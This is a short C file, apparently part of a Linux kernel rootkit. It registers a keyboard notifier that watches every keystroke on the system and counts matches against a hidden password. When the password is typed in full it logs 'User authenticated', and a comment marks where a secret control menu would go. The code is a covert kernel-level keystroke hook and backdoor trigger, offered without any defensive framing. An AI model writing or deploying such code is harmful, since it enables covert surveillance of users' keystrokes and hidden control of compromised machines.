#include "../consts.h"
/* ripped from cedriczirtacic */ 

int _kb_call(struct notifier_block *nb, unsigned long code, void *p) {
    struct keyboard_notifier_param *params = p;

    // we've got some key pressed but not pressure
    if (code == KBD_POST_KEYSYM && !params->down) 
    {
        char p_char = params->value^0xfb00; // clean
        if (p_char == *(PW+matches)) {
            if (++matches == strlen(PW))
            {
            	 // all the keys matched
                printk(KERN_ALERT "[~] User authenticated.");
            	/* add menu stuff here */
            }
            return NOTIFY_OK;
        	}
        else
            // character mismatch, start again
            matches = 0;
    	}
    return NOTIFY_OK;
}
	